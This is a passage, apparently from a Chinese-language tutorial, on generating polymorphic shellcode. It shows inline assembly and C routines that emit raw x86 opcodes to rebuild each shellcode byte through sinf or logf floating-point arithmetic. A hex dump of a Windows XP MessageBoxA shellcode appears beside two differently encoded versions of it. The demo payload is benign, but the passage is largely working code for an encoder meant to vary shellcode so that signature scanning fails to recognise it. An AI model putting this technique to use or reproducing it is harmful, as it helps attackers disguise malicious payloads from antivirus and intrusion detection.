
```asm
__declspec(naked) my_ftol()

{

  __asm

  {

      mov         ebp,esp
      add         esp,0FFFFFFF4h
      wait
      fnstcw      word ptr [ebp-2]
      wait
      mov         ax,word ptr [ebp-2]
      or          ah,0Ch
      mov         word ptr [ebp-4],ax
      fldcw       word ptr [ebp-4]
      fistp       qword ptr [ebp-0Ch]
      fldcw       word ptr [ebp-2]
      mov         eax,dword ptr [ebp-0Ch]
      mov         edx,dword ptr [ebp-8]
      leave
      sub         esp,4  // 注意，这里是自己加入的，因为是我们改写了调用，故需要恢复一下堆栈平衡。
      ret

  }

}
```

### 4.3 - 计算中的优化

大家会注意到这样一条语句

`fmul        dword ptr [__real@4@400c9c40000000000000 (004150a0)]`

我们 `10000 * sinf(172.527252)` 中的`10000`被`__real@4@400c9c40000000000000`所替代，编译器会为这块的相乘的任意数值都分配一个空间来存放一个编译阶段就已经计算好的数值，用于和`fmul`做乘法运算，也就是

`004150a0  __real@4@400c9c40000000000000   00 40 1c 46`（这个计算好的浮点值就是`10000`）

所以我们也要有个这样一个值来模拟这块的运算

```
//fmul  dword ptr [__real@(10000)]
float_to_hex(10000,&g_mul);
d = (unsigned long)&g_mul;
poly_math[(*t)++  ] = 0xd8;  // imul 10000
poly_math[(*t)++  ] = 0x0d;
poly_math[(*t)++  ] = *((char *)&d);
poly_math[(*t)++  ] = *((char *)&d + 1);
poly_math[(*t)++  ] = *((char *)&d + 2);
poly_math[(*t)++  ] = *((char *)&d + 3);
```

```c
void float_to_hex(float f,unsigned long *push_data)
{
  unsigned char ba[4]={0};
  memcpy(&ba[0],&f,4);
  for(int i = 3 ; i >= 0 ; i--)
  {
    *((char *)push_data+i) = ba[i];
  }
}
```

### 4.4 - 生成一个计算过程

```
// x  -- 产生指定的opcode时，对应的随机浮点数
// *t -- poly_math 数组对应的当前索引值
void wirte_code(float x,int *t)
{
  int off;
  unsigned long d;
  float_to_hex(x,&d);
  // push   y (转换浮点到hex后的值)
  poly_math[(*t)++  ] = 0x68 ;
  poly_math[(*t)++  ] = *((char *)&d);
  poly_math[(*t)++  ] = *((char *)&d + 1);
  poly_math[(*t)++  ] = *((char *)&d + 2);
  poly_math[(*t)++  ] = *((char *)&d + 3);
   //call  sinf
  off = get_reloc_offset((unsigned int)(&poly_math[0] + *t),(unsigned int)sinf);
  poly_math[(*t)++  ] = 0xe8;
  poly_math[(*t)++  ] = *((char *)&off);
  poly_math[(*t)++  ] = *((char *)&off + 1);
  poly_math[(*t)++  ] = *((char *)&off + 2);
  poly_math[(*t)++  ] = *((char *)&off + 3);
  //add   esp,4
  poly_math[(*t)++  ] = 0x83;
  poly_math[(*t)++  ] = 0xc4;
  poly_math[(*t)++  ] = 0x04;
  //fmul  dword ptr [__real@(10000)] 中间运行结果也会被转换存储
  float_to_hex(10000,&g_mul);
  d = (unsigned long)&g_mul;
  poly_math[(*t)++  ] = 0xd8;  // imul 10000
  poly_math[(*t)++  ] = 0x0d;
  poly_math[(*t)++  ] = *((char *)&d);
  poly_math[(*t)++  ] = *((char *)&d + 1);
  poly_math[(*t)++  ] = *((char *)&d + 2);
  poly_math[(*t)++  ] = *((char *)&d + 3);
  //fst         dword ptr [ebp-4]
  poly_math[(*t)++  ] = 0xd9;
  poly_math[(*t)++  ] = 0x55;
  poly_math[(*t)++  ] = 0xfc;
  //call  my_ftol
  off = get_reloc_offset((unsigned int)(&poly_math[0] + *t),(unsigned int)my_ftol);
  poly_math[(*t)++  ] = 0xe8;
  poly_math[(*t)++  ] = *((char *)&off);
  poly_math[(*t)++  ] = *((char *)&off + 1);
  poly_math[(*t)++  ] = *((char *)&off + 2);
  poly_math[(*t)++  ] = *((char *)&off + 3);
  // eax,0FFh
  poly_math[(*t)++  ] = 0x25;
  poly_math[(*t)++  ] = 0xff;
  poly_math[(*t)++  ] = 0x00;
  poly_math[(*t)++  ] = 0x00;
  poly_math[(*t)++  ] = 0x00;
  // mov dword ptr ds:[edi],eax
  poly_math[(*t)++  ] = 0x89;
  poly_math[(*t)++  ] = 0x07;
  //inc edi
  poly_math[(*t)++  ] = 0x47;
}
```

这里测试的例子选用了`xpsp3`下的`87`字节 `MessageBoxA`的`shellcode`。

// 原`shellcode`代码
```
00416548 >31 C0 31 DB 31 C9 31 D2 51 68 6C 6C 20 20 68 33  1???襋hll  h3
00416558  32 2E 64 68 75 73 65 72 89 E1 BB 7B 1D 80 7C 51  2.dhuser夅粄€|Q
00416568  FF D3 B9 5E 67 30 EF 81 C1 11 11 11 11 51 68 61  庸^g0飦?Qha
00416578  67 65 42 68 4D 65 73 73 89 E1 51 50 BB 40 AE 80  geBhMess夅QP籃畝
00416588  7C FF D3 89 E1 31 D2 52 51 51 52 FF D0 31 C0 50  |訅?襌QQR?繮
00416598  B8 12 CB 81 7C FF D0 00 00 00 00 00 00 00 00 00  ?藖|?........
004165A8  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
004165B8 >10 59 2F B6 28 65 D1 11 96 11 00 00 F8 1E        Y/?e??..?..
```
下面是对`shellcode`代码，进行两个多态后的数据对比.

// -- 单一使用`sinf` 情况
```
00416758 >60 9C BF F4 66 41 00 68 D8 61 80 42 E8 00 A9 FE  `溈鬴A.h豠€B?
00416768  FF 83 C4 04 D8 0D F0 66 41 00 D9 55 FC E8 9F A8  兡?餱A.賃煥
00416778  FE FF 25 FF 00 00 00 89 07 47 68 B5 ED 02 43 E8  ?%...?Gh淀C
00416788  DD A8 FE FF 83 C4 04 D8 0D F0 66 41 00 D9 55 FC  莰?兡?餱A.賃
00416798  E8 7C A8 FE FF 25 FF 00 00 00 89 07 47 68 D8 61  鑭%...?Gh豠
004167A8  80 42 E8 BA A8 FE FF 83 C4 04 D8 0D F0 66 41 00  €B韬兡?餱A.
004167B8  D9 55 FC E8 59 A8 FE FF 25 FF 00 00 00 89 07 47  賃Y%...?G
004167C8  68 18 09 06 42 E8 97 A8 FE FF 83 C4 04 D8 0D F0  h.B钘兡?
004167D8  66 41 00 D9 55 FC E8 36 A8 FE FF 25 FF 00 00 00  fA.賃6%...
004167E8  89 07 47 68 0B F2 49 43 E8 74 A8 FE FF 83 C4 04  ?Gh
004167F8  D8 0D F0 66 41 00 D9 55 FC E8 13 A8 FE FF 25 FF  ?餱A.賃%
00416808  00 00 00 89 07 47 68 82 E2 90 42 E8 51 A8 FE FF  ...?Gh傗怋鑁
00416818  83 C4 04 D8 0D F0 66 41 00 D9 55 FC E8 F0 A7 FE  兡?餱A.賃皈
00416828  FF 25 FF 00 00 00 89 07 47 68 0B F2 49 43 E8 2E  %...?G
00416838  A8 FE FF 83 C4 04 D8 0D F0 66 41 00 D9 55 FC E8  兡?餱A.賃
00416848  CD A7 FE FF 25 FF 00 00 00 89 07 47 68 E5 73 DD  艇?%...?Gh錽
00416858  41 E8 0B A8 FE FF 83 C4 04 D8 0D F0 66 41 00 D9  A?兡?餱A.
00416868  55 FC E8 AA A7 FE FF 25 FF 00 00 00 89 07 47 68  U?%...?Gh
00416878  55 87 AA 42 E8 E8 A7 FE FF 83 C4 04 D8 0D F0 66  U嚜B梃兡?餱
00416888  41 00 D9 55 FC E8 87 A7 FE FF 25 FF 00 00 00 89  A.賃嚙?%...
00416898  07 47 68 81 AB 5F 43 E8 C5 A7 FE FF 83 C4 04 D8  Gh伀\_C枧兡
...
```
 // -- 单一使用`logf` 情况
```
00416758 >60 9C BF F4 66 41 00 68 38 2A 49 43 E8 F6 A8 FE  `溈鬴A.h8\*IC桷
00416768  FF 83 C4 04 D8 0D F0 66 41 00 D9 55 FC E8 9F A8  兡?餱A.賃煥
00416778  FE FF 25 FF 00 00 00 89 07 47 68 73 EB 38 42 E8  ?%...?Ghs?B
00416788  D3 A8 FE FF 83 C4 04 D8 0D F0 66 41 00 D9 55 FC  莹?兡?餱A.賃
00416798  E8 7C A8 FE FF 25 FF 00 00 00 89 07 47 68 38 2A  鑭%...?Gh8\*
004167A8  49 43 E8 B0 A8 FE FF 83 C4 04 D8 0D F0 66 41 00  IC璋兡?餱A.
004167B8  D9 55 FC E8 59 A8 FE FF 25 FF 00 00 00 89 07 47  賃Y%...?G
004167C8  68 E3 C5 74 43 E8 8D A8 FE FF 83 C4 04 D8 0D F0  h闩tC鑽兡?
004167D8  66 41 00 D9 55 FC E8 36 A8 FE FF 25 FF 00 00 00  fA.賃6%...
004167E8  89 07 47 68 38 2A 49 43 E8 6A A8 FE FF 83 C4 04  ?Gh8\*IC鑚
004167F8  D8 0D F0 66 41 00 D9 55 FC E8 13 A8 FE FF 25 FF  ?餱A.賃%
00416808  00 00 00 89 07 47 68 E8 AA 0B 42 E8 47 A8 FE FF  ...?Gh瑾
00416818  83 C4 04 D8 0D F0 66 41 00 D9 55 FC E8 F0 A7 FE  兡?餱A.賃皈
00416828  FF 25 FF 00 00 00 89 07 47 68 38 2A 49 43 E8 24  %...?Gh8\*IC?
00416838  A8 FE FF 83 C4 04 D8 0D F0 66 41 00 D9 55 FC E8  兡?餱A.賃
00416848  CD A7 FE FF 25 FF 00 00 00 89 07 47 68 6A C1 43  艇?%...?Ghj罜
00416858  41 E8 01 A8 FE FF 83 C4 04 D8 0D F0 66 41 00 D9  A?兡?餱A.
00416868  55 FC E8 AA A7 FE FF 25 FF 00 00 00 89 07 47 68  U?%...?Gh
00416878  AB 08 A9 42 E8 DE A7 FE FF 83 C4 04 D8 0D F0 66  ?〣柁兡?餱
00416888  41 00 D9 55 FC E8 87 A7 FE FF 25 FF 00 00 00 89  A.賃嚙?%...
00416898  07 47 68 3A 52 3B 43 E8 BB A7 FE FF 83 C4 04 D8  Gh:R;C杌兡
```

如果每次选择不同的数字函数进行变化，就可以产生完全不相同`polymorphic`代码了。

### [0x06].其他

扩展一下思路大家就会发现这样的变形方式适合很多领域和不同情况的组合，只要任意发挥就会有意想不到的结果。
